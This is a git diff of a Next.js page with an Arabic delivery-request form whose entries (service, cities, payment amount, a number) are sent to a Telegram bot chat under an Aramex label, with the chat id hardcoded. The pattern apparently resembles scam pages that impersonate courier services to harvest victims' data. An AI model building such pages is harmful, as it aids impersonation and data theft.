@@ -1,11 +1,14 @@
 "use client"
 import { useRef } from 'react'
 import styles from './fozajil.module.css'
-import bot from '@/compnante/dataBot'
+// import bot from '@/app/dataBot'
 import {useRouter,useSearchParams} from 'next/navigation'
 
 
 const Page = () => {
+
+  const token = process.env.TOKEN;
+  const pass = 7017479979
   let typeRequest = useRef();
   let numshoh = useRef();
   let fromcity = useRef();
@@ -17,7 +20,7 @@ const Page = () => {
   
   const router = useRouter()
 
-  const handlerout = () => {
+  const  handlerout =  () => {
     
 if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.value == "" || tocity.current.value == "" || mony.current.value == ""|| numshoh.current.value == "") {
       alert('من فضلك قم بملى الحقول')
@@ -29,11 +32,10 @@ if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.valu
 
   const handleSubmit = (e) => {
     e.preventDefault();
-
     var length =`مدونة ارامكس %0A   نوع الخدمة : ${typeRequest.current.value} %0A من  : ${fromcity.current.value} %0A  الى : ${tocity.current.value} %0A قيمة السداد:${mony.current.value} %0A %0A ${numshoh.current.value}`
+    
 
-
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
 
 
   }
@@ -42,7 +44,9 @@ if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.valu
     <div className={styles.contain} dir='rtl'>
       <div className={styles.navbar}>
         <h2>طلب  توصيل واستلام</h2>
+
       </div>
+      
         <form onSubmit={handleSubmit}> 
 
 
